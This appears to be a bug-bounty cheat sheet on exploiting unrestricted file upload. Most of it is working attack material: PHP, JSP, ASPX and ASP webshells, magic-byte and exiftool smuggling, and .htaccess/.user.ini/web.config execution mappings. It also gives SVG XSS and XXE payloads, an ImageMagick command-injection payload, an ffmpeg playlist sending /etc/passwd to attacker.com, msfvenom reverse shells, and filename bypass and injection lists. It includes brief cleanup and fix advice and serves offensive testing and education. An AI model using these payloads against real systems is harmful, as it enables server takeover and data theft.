# Unrestricted File Upload

> One-line summary: Weak upload validation lets you store an executable file (webshell) on the server — when it's reachable and executes, it's immediate RCE; even when it doesn't, it chains into XSS, XXE, and SSRF.

## Overview

File upload vulnerabilities arise when an application accepts a file but fails to properly validate the extension, content type, magic bytes, or where the file ends up. If the upload directory is web-accessible and the server executes the uploaded file type (PHP/JSP/ASP), the attacker gets remote code execution by requesting their webshell. Even without direct execution, uploads enable stored XSS (SVG/HTML served on the app's origin), XXE (DOCX/SVG parsed by the backend), and SSRF (media pipelines like ffmpeg/ImageMagick fetching URLs from metadata). It's a staple bug-bounty critical because the validation is usually a naive extension check, and bypasses are well-known.

## Where to find it

- Avatar/profile picture upload (also the "avatar cropper" step — a second endpoint that often skips validation)
- Attachments in support tickets, chat, comments, forums, notes
- Resume/CV upload in careers forms (often processed by a separate service)
- Import features: CSV/XLSX/DOCX import, config restore, backup upload, plugin/theme/module install
- Rich-text editors with image/file paste (uploads behind `/api/media`, `/upload`, `/attachments`)
- Document generators: logos, signatures, letterheads used in PDF generation
- Webhook/API file endpoints (`multipart/form-data` to `/v2/files`)
- Anything with a `filename` you control in the multipart body, S3 presigned POST, or base64 "upload as JSON"
- Favicon/cover/banner uploads; SVG accepted anywhere

## Methodology

1. **Find candidates** — enumerate all upload endpoints (crawl, JS analysis, `.json` API specs). For each, note what the feature does with the file afterward (display, parse, convert, archive) — that determines your escalation.
2. **Baseline a valid upload** — upload `test.png`. Record: the response (JSON path/URL?), where the file is served from (same origin? CDN domain? path?), filename mangling (UUID/hash/original), and whether the original extension survives.
3. **Map the validation stack** — try in order, observing each rejection message:
   - wrong extension (`.txt`, `.php`) → extension check present?
   - right extension but `Content-Type: text/plain` → content-type check?
   - `.php` renamed to `.png` with `Content-Type: image/png` → magic byte check (`getimagesize`)?
   - real PNG but renamed `.php` → does it save with *your* extension or force `.png`?
   - after upload, download your own PNG and compare bytes → does the app *re-encode* (pixel data changes = GD/ImageMagick reprocessing → classic webshell tricks die, pivot to SVG/office/filename attacks)?
4. **Execute the bypass matrix** (see Payloads/Bypasses): alternative PHP extensions (`.phtml`, `.php5`, `.php7`, `.phar`, `.pht`), double extensions (`shell.php.jpg`, `shell.jpg.php`), case (`shell.PHP`), trailing dot/space (Windows), null byte (`shell.php%00.jpg`, legacy PHP < 5.3.4), content-type spoof, magic-byte prefix.
5. **If extension checks are strict but `.htaccess`/`.user.ini` are accepted** — upload a mapping file first, then the payload with an image extension. Apache: `.htaccess` with `AddType application/x-httpd-php .gif`. PHP-FPM: `.user.ini` with `auto_prepend_file`. IIS: `web.config` handlers.
6. **Retrieve and execute** — request the stored URL. A 200 with your PHP *source* means no execution — check `.php` is mapped; a blank 500 means near-miss (syntax error → your code ran). For LFI-prone apps, chain: upload image-embedded PHP + `?page=uploads/shell.jpg` include.
7. **Non-execution escalations when the directory never executes** — SVG → stored XSS (`Content-Type: image/svg+xml` served on app origin, `<script>` fires); DOCX/SVG → XXE (backend parser); filename → command injection if a backend runs `convert "uploads/<filename>"`; ZIP import → Zip Slip (`../../` entry names) to overwrite files.
8. **Confirm without damage** — prove RCE with `id`/`whoami` only; delete the webshell afterward and say so in the report. Never leave a persistent shell in a shared upload directory.

## Payloads

```bash
# Magic byte preparation — GIF header + PHP (passes naive type sniffing and getimagesize)
printf 'GIF89a;\n' > shell.gif
printf '<?php system($_GET["c"]); ?>\n' >> shell.gif
# upload as shell.gif (bypass), or rename to shell.php keeping the GIF89a header

# PNG magic bytes (when the check wants a real PNG signature)
printf '\x89PNG\r\n\x1a\n' > shell.php
printf '<?php system($_GET["c"]); ?>\n' >> shell.php
```

```bash
# exiftool — hide PHP inside image metadata, then give it an executable extension
exiftool -Comment='<?php system($_GET["c"]); ?>' avatar.jpg
cp avatar.jpg shell.php          # still a valid JPEG; PHP executes it anyway

exiftool -Comment='<?php echo file_get_contents("/etc/passwd"); ?>' logo.png
cp logo.png shell.php
```

```php
# PHP webshells — smallest first
<?=`$_GET[0]`?>
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php ($_=@$_GET[1]).$_(@$_GET[2]); ?>        # ?1=sys&2=tem&3=id
<?php $f="sys"."tem"; $f($_GET['c']); ?>      # keyword-filter evasion
<?php echo file_get_contents($_GET['f']); ?>  # file-read-only shell (lower-risk proof)
```

```apache
# .htaccess webshell mapping — upload this FIRST, then a .gif containing PHP
AddType application/x-httpd-php .gif

# or scoped:
<FilesMatch "^shell">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
; .user.ini — PHP-FPM (FastCGI) mapping, upload first, executes on the NEXT request
auto_prepend_file=shell.gif
```

```jsp
<%-- shell.jsp — upload where JSP mapping exists --%>
<%@ page import="java.util.*,java.io.*" %>
<%
  Process p = Runtime.getRuntime().exec(request.getParameter("c"));
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l;
  while ((l = br.readLine()) != null) { out.println(l); }
%>
```

```asp
<%-- shell.aspx --%>
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["c"]); %>
```

```asp
<% ' shell.asp (classic ASP) %>
<% eval request("c") %>
```

```xml
<!-- Shell as a web.config (IIS) — uploaded instead of code (only where app pool allows) -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="x" path="*.gif" verb="*" modules="IsapiModule" scriptProcessor="c:\windows\system32\inetsrv\asp.dll" resourceType="File" />
    </handlers>
  </system.webServer>
</configuration>
```

```xml
<!-- SVG upload → stored XSS (served on app origin as image/svg+xml) -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)" width="200" height="200">
  <script type="text/javascript">alert(document.domain);</script>
</svg>
```

```xml
<!-- SVG upload → XXE when the backend parses the SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
  <text x="10" y="30">&xxe;</text>
</svg>
```

```mvg
-- ImageMagick MVG payload (CVE-2016-3714 chain — only against vulnerable ImageMagick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1:1337/test.jpg"|id > /tmp/pwned")'
pop graphic-context
```

```bash
# ffmpeg HLS SSRF via uploaded playlist (CVE-2016-1897/1898 — vulnerable ffmpeg in media pipelines)
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST
```

```bash
# Request shape — spoofing Content-Type while keeping the executable filename
curl -k -X POST https://target.com/api/avatar \
  -F 'file=@shell.php;type=image/png;filename=shell.php' \
  -H 'Cookie: session=...'

# Double-extension probe via filename parameter
curl -k -X POST https://target.com/api/upload \
  -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'
```

## Bypasses & edge cases

- **Alternative executable extensions** — if `.php` is blocked, try `.php3 .php4 .php5 .php7 .phtml .pht .phps .phar .inc`; JSP: `.jsp .jspx .jspf .jsw .jsv`; ASP: `.asp .aspx .ashx .asmx .ascx .asax .cer .cdx .asa`; other: `.shtml .shtm .cgi .pl .py .rb .sh .swf`. Any of these mapped by the server = RCE.
- **Blacklist bypass via case** — `shell.PHP`, `shell.PhP` if the comparison is case-sensitive on a case-insensitive filesystem.
- **Double extension** — `shell.php.jpg` (naive check looks at the *first* extension), `shell.jpg.php` (check looks at the *second*), `shell.php.png`.
- **Trailing characters (Windows)** — `shell.php.` (trailing dot stripped by Windows), `shell.php ` (trailing space), `shell.php::$DATA` (NTFS alternate data stream — file written as `shell.php`).
- **IIS6 semicolon** — `shell.asp;.jpg`, `shell.asp;1.jpg` — old IIS stops parsing the name at the semicolon.
- **Null byte (legacy)** — `shell.php%00.jpg` (PHP < 5.3.4 / some Java servers) — validation sees `.jpg`, filesystem sees `.php`.
- **Content-Type spoofing** — always set `type=image/jpeg` in the multipart part, regardless of content: many stacks trust the client header outright.
- **Magic-byte stubbing** — prepend `GIF89a` or a real PNG header; combine with metadata injection (exiftool) so `getimagesize()` succeeds and your payload still ships.
- **Re-encoding defeats everything** — if the app re-saves the image (changes bytes on download), classic tricks fail. Pivot: SVG (XSS/XXE), office files (XXE), filename injection (the original filename is passed to a shell/`convert`), path traversal in filename, ZIP entries.
- **Path traversal in filename** — `filename=../../../../var/www/html/shell.php`; also in ZIP imports (`zip` entries with `../` = Zip Slip). Test carefully and clean up if it lands outside the upload dir.
- **Race conditions** — uploads scanned asynchronously: if the file is accessible before the scanner finishes, fetch and execute quickly; some pipelines also serve the file during scanning.
- **S3/CDN fronts** — presigned POST lets you set the `Content-Type` and `key`, so `key=shell.html` + PNG content often serves as `text/html` on the bucket domain (stored XSS on the bucket origin), or `key=..%2f..%2f` where path handling is wrong.
- **SVG sanitizer bypasses** — sanitizers often strip `<script>` but miss `<use href="data:...">`, `<foreignObject>`, `<animate onbegin=...>`, `<set attributeName=onload ...>`; test with an out-of-band `fetch('https://interactsh/callback')` in the SVG to detect execution silently.

## Tools

```bash
# fuxploider — brute-forces extension/content-type/magic-byte bypasses against an upload endpoint
git clone https://github.com/almandin/fuxploider
python3 fuxploider.py --url https://target.com/upload --not-regex "invalid (file|image) type"
python3 fuxploider.py --url https://target.com/upload --not-regex "error" --cookie "session=abc123"
# it uploads its own test files and flags the ones that stored successfully

# exiftool — metadata injection into JPEG/PNG
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg && cp image.jpg shell.php
exiftool image.jpg | grep -i comment        # verify the comment landed

# weevely — generate + operate a small obfuscated PHP webshell (for the RCE proof)
weevely generate s3cr3t_pass /tmp/shell.php
weevely https://target.com/uploads/shell.php s3cr3t_pass
```

```bash
# Burp Upload Scanner (BApp Store) — GUI extension: Extender → BApp Store → "Upload Scanner"
# then right-click the upload request → "Scan file upload" — auto-tests extensions,
# content-types, magic bytes, and detects stored/executed payloads.
```

```bash
# msfvenom — war/jsp payloads for Tomcat/Jakarta servers (only where the program allows)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f war -o shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f raw -o shell.jsp
```

```bash
# Confirm what the server stored (magic bytes / encoding) — download and inspect
curl -s https://target.com/uploads/xyz.png -o check.bin
file check.bin && xxd check.bin | head -3
# bytes changed vs original → re-encoding; identical → your payload survived
```

## Escalation & chaining

- **Upload → RCE (direct)** — webshell in the webroot → `?c=id` → shell → container/host impact as in command-injection escalation.
- **Upload → RCE (mapping file)** — `.htaccess`/`.user.ini`/`web.config` written first, then the payload with an innocuous extension.
- **Upload → LFI include** — image-embedded PHP (`GIF89a<?php ... ?>`) + an LFI/`include($_GET['page'])` elsewhere → PHP executes the image as code. Classic combo when the uploads dir has `php_flag engine off`.
- **Upload → XXE** — export a DOCX/XLSX/SVG with an entity payload; the import/parse path is often a different service with broader file access.
- **Upload → SSRF** — ffmpeg/ImageMagick/`wkhtmltopdf` fetch URLs embedded in metadata or playlists → internal services (`169.254.169.254`, internal admin APIs).
- **Upload → stored XSS** — SVG or HTML on the app origin (or mislabeled S3 objects) → session theft on every viewer (e.g. an admin opening the file).
- **Upload → Zip Slip → overwrite** — a crafted ZIP in "import/restore" writes outside the target dir; overwriting a template/plugin file yields RCE on the next request.
- **Upload → DoS via pipeline** — "image bomb" / decompression bomb in processors (again: recognize, don't demonstrate on live targets).
- **Upload path traversal → config overwrite** — `filename=../.env` or `../app/config.php` where the write primitive is unfiltered — verify and roll back.

## Report notes

- The exact multipart request: filename, `Content-Type` per part, file bytes (hexdump of the first 16 bytes if a magic-byte trick is used), and the server response.
- The stored URL and proof of access: `GET /uploads/shell.php?c=id` returning `uid=33(www-data)...` — raw request/response, not just a screenshot of the browser.
- If execution is blocked, prove the *stored* injection another way: served `Content-Type: image/svg+xml` + `alert(document.domain)` screenshot for XSS; interactsh callback for backend parsing; ssrf metadata response (redacted) for media pipelines.
- Cleanup statement: "webshell deleted via the app's own delete function / `rm` at `<path>` on `<timestamp>`" — reviewers value it and it protects you.
- Impact sentence: "Any authenticated user can upload `shell.php` (or bypass with `shell.gif` + `.htaccess`) and execute OS commands as `www-data` on the production web server — verified with `id`, shell removed after."
- Include the validation observed and the single bypass that worked (e.g. "extension allowlist enforced, but `Content-Type` trusted and `.phtml` is server-mapped").
- Fix: allowlist extensions AND verify magic bytes AND re-encode images; store outside webroot; serve with `Content-Disposition: attachment`; no execution in upload dir (`php_flag engine off`); randomize filenames; scan asynchronously — never trust client `Content-Type`.

## Lab walkthroughs & quick reference

### PortSwigger lab: Web shell upload via path traversal

1. Upload `shell.php` — the server returns it as plain text (stored, but not executed)
2. Inspect the upload request in Burp: `Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
3. Modify the filename to escape the upload directory:
```http
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fexploit.php"
```
4. Request the stored file again — the server now executes it as PHP

### PortSwigger lab: Web shell upload via extension blacklist bypass

1. Upload a PHP shell — the app blocks `.php`
2. Upload a file named `.htaccess` (itself not blacklisted) with contents:
```apache
AddType application/x-httpd-php .l33t
```
3. Upload the same shell renamed `exploit.php` → `exploit.l33t`
4. Request `exploit.l33t` — Apache now executes it as PHP

### Zip extraction → arbitrary file read (symlink)

When an upload accepts ZIP archives that get auto-extracted, extract the archive server-side but ship a symlink inside:

```bash
mkdir /tmp/zipupload
ln -s ../../../index.php /tmp/zipupload/index.txt   # point at the file you want to read
cd /tmp/zipupload
zip -y /tmp/zipupload.zip index.txt                 # -y stores the symlink itself
```

Upload `zipupload.zip`. When the app extracts and serves `index.txt`, it follows the symlink and returns `../../../index.php` contents.

### Extension quick reference (build your fuzz list from these)

PHP:
```text
.php .phtml .php3 .php4 .php5 .php7 .php8 .phps .pht .phpt .phar .phtm .pgif .inc .pHp
```

ASP.NET / classic ASP / IIS (also try semicolon/colon variants):
```text
.asp .aspx .ashx .asmx .ascx .asax .asa .cer .cdx .config .soap .cshtml .svc
.asp;1.jpg .aspx;1.jpg .asp:.jpg .aspx:.jpg
```

Filename bypass characters:
```text
%20  %0a  %00  %0d0a  /  .\  .  ...  :
```

Filename manipulation examples (paste into Intruder/ffuf as the filename):
```text
shell%20.php.jpg        shell.php%20.jpg        shell.jpg%20.php        shell.jpg.php%20
shell%0a.php.jpg        shell.php%0a.jpg        shell.jpg%0a.php        shell.jpg.php%0a
shell%00.php.jpg        shell.php%00.jpg        shell.jpg%00.php        shell.jpg.php%00
shell%0d0a.php.jpg      shell.php%0d0a.jpg      shell.jpg%0d0a.php      shell.jpg.php%0d0a
shell/.php.jpg          shell.php/.jpg          shell.jpg/.php          shell.jpg.php/
shell.\.php.jpg         shell.php.\.jpg         shell.jpg.\.php         shell.jpg.php.\
shell..php.jpg          shell.php..jpg          shell.jpg..php          shell.jpg.php.
shell….php.jpg          shell.php….jpg          shell.jpg….php          shell.jpg.php…
shell:.php.jpg          shell.php:.jpg          shell.jpg:.php          shell.jpg.php:
do.php%00.png           do.php%0A.png           do.php%0D.png           do.php%0D%0A.png
do.php%09.png           do.php%20.png           do.php%23.png           do.php%3B.png
do.php%2E.png           do.php%252Epng          do.php%252F.png         do.php%2523.png
do.php%2500.png         do.php%250A.png         do.php%250D.png
do.php.png              do.php.jpg              do.php.jpeg             do.php.gif
do.php.txt.png          do.php.jpg.png          do.php.jpeg.jpg         do.php.png.jpg
do.php;.png             do.PHP.png              do.PhP.png              do.pHp.png
DO.php.png              do.php.PNG              do.php.PnG
do%2Ephp.png            do%2ephp.png            do.php%2epng            do%252Ephp.png
do.php/.png             do.php%2F.png           do.php%5C.png           do.php\.png
do.php/..png            do.php%2e%2e%2f.png
```

### Path traversal in filename — variants

```text
../shell.php
../../shell.php
../../../var/www/shell.php
..%2fshell.php
..%252fshell.php
..%c0%afshell.php        (overlong UTF-8, legacy Java servers)
shell.php%00.jpg
shell.php\x00.jpg
```

### Magic-byte quick one-liners

```bash
# PNG
echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.php
# JPEG
echo -e "\xFF\xD8\xFF<?php system(\$_GET['cmd']); ?>" > shell.php
# GIF
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php
```

### PHP reverse shell (msfvenom)

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

### Useful PHP functions reference

```php
exec()  system()  shell_exec()  passthru()  file_get_contents()  file_put_contents()
```

### Filename → command injection

If the app uses uploaded filenames in OS commands (`convert "uploads/<filename>"`), the filename itself is an injection point:

```text
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

### File-read-only proof payload

When you want a lower-risk PoC instead of a full webshell:

```php
<?php file_get_contents('file_path'); ?>
```

## References

- [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [PortSwigger — Bypassing upload validation (cheat sheet, labs)](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [HackTricks — File upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [fuxploider](https://github.com/almandin/fuxploider)
- [weevely3](https://github.com/epinna/weevely3)
